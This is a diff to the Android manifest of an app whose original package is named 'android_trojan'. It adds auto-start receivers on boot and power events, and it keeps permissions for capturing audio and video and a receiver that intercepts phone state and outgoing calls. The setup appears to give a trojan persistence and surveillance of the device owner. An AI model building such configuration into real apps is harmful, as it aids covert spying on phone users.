@@ -15,17 +15,25 @@
     <uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT" />
     <uses-permission android:name="android.permission.CAPTURE_VIDEO_OUTPUT" />
     <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
 
     <application
         android:allowBackup="true"
         android:icon="@drawable/ic_launcher"
         android:label="@string/app_name"
         android:theme="@style/AppTheme" >
+
         <service
-            android:name="trojan.android.android_trojan.BackgroundService"
+            android:name=".Service.BackgroundService"
             android:enabled="true"/>
+
+        <service
+            android:name=".Service.NotificationReceiver"
+            android:enabled="true"/>
+
         <activity
-            android:name="trojan.android.android_trojan.MainActivity"
+            android:name=".Activity.MainActivity"
             android:label="@string/app_name" >
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -33,18 +41,24 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
-        <activity android:name=".first_activity"
-        />
-        <activity android:name=".second_activity"
-        />
-        <activity android:name=".NotificationReceiver"
-            />
-        <receiver android:name=".PhoneStateReceiver">
+
+        <activity android:name=".Activity.first_activity"/>
+        <activity android:name=".Activity.second_activity"/>
+
+        <receiver android:name=".BroadcastReceiver.PhoneStateReceiver">
             <intent-filter android:priority="0">
                 <action android:name="android.intent.action.PHONE_STATE" />
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
             </intent-filter>
         </receiver>
+
+        <receiver android:name=".BroadcastReceiver.AutoStart">
+            <intent-filter android:priority="1">
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+            </intent-filter>
+        </receiver>
+
     </application>
 
 </manifest>
